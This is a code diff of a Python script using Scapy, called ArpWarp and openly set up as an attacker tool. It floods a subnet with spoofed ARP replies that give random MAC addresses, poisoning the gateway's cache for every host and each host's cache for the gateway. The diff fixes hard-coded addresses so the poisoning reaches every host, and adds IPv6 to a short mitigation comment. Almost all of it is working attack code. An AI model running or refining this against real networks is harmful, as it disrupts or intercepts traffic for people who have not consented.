@@ -4,7 +4,6 @@ import ipaddress
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
 from scapy.all import *
-from typing import Dict, Union
 conf.verb = 0
 
 #   --------------------------------------------------------------------------------------------------------------------
@@ -16,6 +15,7 @@ conf.verb = 0
 #
 #   Mitigation
 #       * Static ARP table
+#       * Use IPv6
 #
 #   --------------------------------------------------------------------------------------------------------------------
 
@@ -27,9 +27,6 @@ banner = """
 ../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
 """
 
-# TODO ipv4 only supported?
-# todo mac for gateway
-
 
 class ArpWarp:
     _P_TIMEOUT = 2
@@ -39,38 +36,36 @@ class ArpWarp:
         print(f"[*] Setting up attacker...")
 
         self.network_interface = iface
-        conf.iface = iface  # TODO above also not needed?
+        conf.iface = self.network_interface
         self.cidr = cidr
-
-        self.my_mac = Ether().src
-        self.my_private_ip = get_if_addr(self.network_interface)
         self.arp_poison_interval = s_time
 
+        self.my_private_ip = get_if_addr(self.network_interface)
         self.subnet = self.my_private_ip.split(".")[:3]
+
         self.gateway_ip = gateway or f"{'.'.join(self.subnet)}.1"
         self.gateway_mac = getmacbyip(self.gateway_ip)
 
         if not self.gateway_mac:
             raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")
 
-        self.host_ips = [host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                         host_ip != self.my_private_ip and host_ip != self.gateway_ip]  # TODO where are the rest
+        self.host_ips = [str(host_ip) for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
+                         str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ip]
         print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
 
         self.abort = False
 
     def poison_arp(self):
         """
-        iterate over all spoofed entries, and send each host (inside an inner loop) the
-        arp packets of the scrambled entries
+        * poison the gateway arp cache with a spoofed mac address for every possible host
+        * poison every possible host with a spoofed mac address for the gateway
         """
         for host_ip in self.host_ips:
             # poison gateways's arp cache
-            arp_packet_gateway = ARP(op=2, psrc="10.0.0.1", hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
-            print(host_ip)
+            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
             sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
             # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst="10.0.0.1")
+            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
             sendp(Ether() / arp_packet_host, iface=self.network_interface)
 
     def start_attack(self):
@@ -87,7 +82,6 @@ class ArpWarp:
             except KeyboardInterrupt:
                 print(f"[*] User requested to stop...")
                 self.abort = True
-        print("[*] Restoring arp...")
 
 
 if __name__ == "__main__":
@@ -113,4 +107,3 @@ if __name__ == "__main__":
 
     warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time, arguments.gateway)
     warper.start_attack()
-
